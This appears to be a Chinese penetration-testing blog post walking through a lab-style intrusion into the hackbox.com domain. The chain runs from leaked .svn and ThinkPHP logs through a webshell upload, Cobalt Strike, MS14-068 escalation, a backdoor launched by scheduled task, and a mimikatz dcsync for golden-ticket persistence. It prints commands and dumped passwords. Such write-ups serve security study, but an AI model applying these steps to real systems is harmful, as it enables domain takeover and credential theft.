@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集网站主页  .svn 泄露 SQLite 数据库文件扫描目录发现.svn 信息泄露，wc.db 是 SQLite 数据库文件  Thinkphp 日志泄露直接访问这个文件把它下载下来用 Navicat 打开  编写脚本遍历日志或者使用工具检测  日志泄露管理员密码 日志记录了管理员修改密码的操作   Getshell子域名爆破网站后台 后台上传文件 getshell使用 admin&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="外网打点到域控上线">
+<meta property="og:url" content="http://example.com/posts/1541051201/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="信息收集网站主页  .svn 泄露 SQLite 数据库文件扫描目录发现.svn 信息泄露，wc.db 是 SQLite 数据库文件  Thinkphp 日志泄露直接访问这个文件把它下载下来用 Navicat 打开  编写脚本遍历日志或者使用工具检测  日志泄露管理员密码 日志记录了管理员修改密码的操作   Getshell子域名爆破网站后台 后台上传文件 getshell使用 admin&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631925058/1_m666qm.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631925418/2_g4utns.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631926547/3_r4eux6.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631927418/5_u4bvzx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631927689/6_d8dfsf.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631927897/7_np0dop.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631928056/8_gonyez.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631931270/9_t2umoe.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631931821/10_zbtbqp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631932210/10_rxy2st.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631933741/14_kkwbig.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631934241/18_if0omr.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631934119/17_ghzvhe.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631934014/15_jvjas2.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631934015/16_r45bgh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631937769/19_dop5tl.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631938114/20_oao5wv.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631938429/21_bjnfng.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631938662/21_g103kx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631938922/22_hhg1w0.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631939565/23_mts6tz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631939565/24_sbub2k.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631939569/25_ppeavp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631939660/26_fodzph.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631940131/27_b3esjp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631940413/28_zdiuah.png">
+<meta property="article:published_time" content="2021-05-10T08:33:51.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.472Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1631925058/1_m666qm.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>外网打点到域控上线</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/775123418/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/782722891/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/1541051201/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/1541051201/&text=外网打点到域控上线"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/1541051201/&is_video=false&description=外网打点到域控上线"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=外网打点到域控上线&body=Check out this article: http://example.com/posts/1541051201/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/1541051201/&name=外网打点到域控上线&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/1541051201/&t=外网打点到域控上线"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#svn-%E6%B3%84%E9%9C%B2-SQLite-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">.svn 泄露 SQLite 数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thinkphp-%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">Thinkphp 日志泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-number">2.</span> <span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.</span> <span class="toc-text">子域名爆破网站后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">后台上传文件 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobalt-Strike-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">Cobalt Strike 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.2.</span> <span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068-%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">ms14-068 普通域用户权限提升为域控权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.4.</span> <span class="toc-text">上线域控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.</span> <span class="toc-text">权限维持之黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E6%8E%A7-krbtgt-%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">抓取域控 krbtgt 账户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.2.</span> <span class="toc-text">制作票据</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        外网打点到域控上线
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-10T08:33:51.000Z" itemprop="datePublished">2021-05-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>网站主页</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631925058/1_m666qm.png"></p>
+<h3 id="svn-泄露-SQLite-数据库文件"><a href="#svn-泄露-SQLite-数据库文件" class="headerlink" title=".svn 泄露 SQLite 数据库文件"></a>.svn 泄露 SQLite 数据库文件</h3><p>扫描目录发现.svn 信息泄露，wc.db 是 SQLite 数据库文件</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631925418/2_g4utns.png"></p>
+<h3 id="Thinkphp-日志泄露"><a href="#Thinkphp-日志泄露" class="headerlink" title="Thinkphp 日志泄露"></a>Thinkphp 日志泄露</h3><p>直接访问这个文件把它下载下来用 Navicat 打开</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631926547/3_r4eux6.png"></p>
+<p>编写脚本遍历日志或者使用工具检测</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png"></p>
+<p><strong>日志泄露管理员密码</strong></p>
+<p>日志记录了管理员修改密码的操作</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927418/5_u4bvzx.png"></p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><h3 id="子域名爆破网站后台"><a href="#子域名爆破网站后台" class="headerlink" title="子域名爆破网站后台"></a>子域名爆破网站后台</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927689/6_d8dfsf.png"></p>
+<h3 id="后台上传文件-getshell"><a href="#后台上传文件-getshell" class="headerlink" title="后台上传文件 getshell"></a>后台上传文件 getshell</h3><p>使用 admin&#x2F;admin666 登录</p>
+<p>经过测试，这个后台验证码可以多次复用，尝试爆破也是可以的</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927897/7_np0dop.png"></p>
+<p>上传一个冰蝎马连接即可</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631928056/8_gonyez.png"></p>
+<h2 id="Cobalt-Strike-后渗透"><a href="#Cobalt-Strike-后渗透" class="headerlink" title="Cobalt Strike 后渗透"></a>Cobalt Strike 后渗透</h2><p>因为目标主机是 windows 环境 我们上线 cs 进行后续渗透</p>
+<p>查了下目标主机没有 AV，直接上线 cs<br><img src="https://res.cloudinary.com/lin1109/image/upload/v1631931270/9_t2umoe.png"></p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>hash 和密码明文</strong></p>
+<p>上线权限很高不用提权，先跑一波 hash 和明文密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631931821/10_zbtbqp.png"></p>
+<p>获得两个账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hackbox\web		!@#Qwe456 		\\域内普通账户</span><br><span class="line">Administrator  T1//@1607#@ 		\\本地管理员账户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631932210/10_rxy2st.png"></p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all </span><br></pre></td></tr></table></figure>
+
+<p>双网卡主机、可以看到当前处在 hackbox.com 的域环境中</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631933741/14_kkwbig.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p>只有一个域</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934241/18_if0omr.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934119/17_ghzvhe.png"></p>
+<p><strong>定位域控</strong></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934014/15_jvjas2.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631934015/16_r45bgh.png"></p>
+<p>DC ip 就是 192.168.150.254</p>
+<h3 id="ms14-068-普通域用户权限提升为域控权限"><a href="#ms14-068-普通域用户权限提升为域控权限" class="headerlink" title="ms14-068 普通域用户权限提升为域控权限"></a>ms14-068 普通域用户权限提升为域控权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USAGE:</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   -p &lt;clearPassword&gt;</span><br><span class="line">	--rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">-u  域成员名@域名</span><br><span class="line">-s  域成员sid</span><br><span class="line">-d  域控制器地址</span><br><span class="line">-p  域成员密码</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 192.168.150.254 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631937769/19_dop5tl.png"></p>
+<p>使用工具将.ccache 文件转化为 kirbi 格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rvazarkar/KrbCredExport</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 KrbCredExport.py TGT_web@hackbox.com.ccache  dc.ticket</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938114/20_oao5wv.png"></p>
+<p><strong>导入生成的票据</strong></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938429/21_bjnfng.png"></p>
+<h3 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h3><p>票据已经注入了，现在身份是域管理员我们可以直接访问域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938662/21_g103kx.png"></p>
+<p><strong>拷贝后门文件至域控</strong></p>
+<p>由于 DC 不出网 考虑正向连接 使用 smb 上线</p>
+<p>建立一个 smb 监听 生成 exe 后门即可</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631938922/22_hhg1w0.png"></p>
+<p><strong>计划任务运行后门上线</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\dc  #查看域控当前时间</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939565/23_mts6tz.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\dc 12:29:14 c:/smb.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939565/24_sbub2k.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link dc  //连接域控</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939569/25_ppeavp.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631939660/26_fodzph.png"></p>
+<h2 id="权限维持之黄金票据"><a href="#权限维持之黄金票据" class="headerlink" title="权限维持之黄金票据"></a>权限维持之黄金票据</h2><h3 id="抓取域控-krbtgt-账户信息"><a href="#抓取域控-krbtgt-账户信息" class="headerlink" title="抓取域控 krbtgt 账户信息"></a>抓取域控 krbtgt 账户信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz&#x27;s lsadump::dcsync /domain:hackbox.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631940131/27_b3esjp.png"></p>
+<h3 id="制作票据"><a href="#制作票据" class="headerlink" title="制作票据"></a>制作票据</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631940413/28_zdiuah.png"></p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#svn-%E6%B3%84%E9%9C%B2-SQLite-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">.svn 泄露 SQLite 数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thinkphp-%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">Thinkphp 日志泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-number">2.</span> <span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.</span> <span class="toc-text">子域名爆破网站后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">后台上传文件 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobalt-Strike-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">Cobalt Strike 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.2.</span> <span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068-%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">ms14-068 普通域用户权限提升为域控权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.4.</span> <span class="toc-text">上线域控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.</span> <span class="toc-text">权限维持之黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E6%8E%A7-krbtgt-%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">抓取域控 krbtgt 账户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.2.</span> <span class="toc-text">制作票据</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/1541051201/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/1541051201/&text=外网打点到域控上线"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/1541051201/&is_video=false&description=外网打点到域控上线"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=外网打点到域控上线&body=Check out this article: http://example.com/posts/1541051201/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/1541051201/&title=外网打点到域控上线"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/1541051201/&name=外网打点到域控上线&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
